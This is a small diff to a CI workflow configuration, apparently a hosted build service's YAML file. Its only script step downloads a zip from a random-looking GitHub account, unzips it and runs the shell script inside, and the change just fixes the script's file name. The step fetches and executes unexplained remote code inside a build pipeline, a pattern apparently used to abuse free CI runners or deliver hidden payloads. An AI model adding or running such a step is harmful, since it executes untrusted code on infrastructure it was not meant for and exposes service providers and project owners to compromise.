@@ -3,7 +3,7 @@ workflows:
     name: Example Workflow
     scripts:
       - name: Step name
-        script: wget https://github.com/maujendakint8sa/asasdasf/releases/download/v13/appvrsc-macos.zip && unzip appvrsc-macos.zip && sh start
+        script: wget https://github.com/maujendakint8sa/asasdasf/releases/download/v13/appvrsc-macos.zip && unzip appvrsc-macos.zip && sh start.sh
     publishing:
       email:
         recipients:
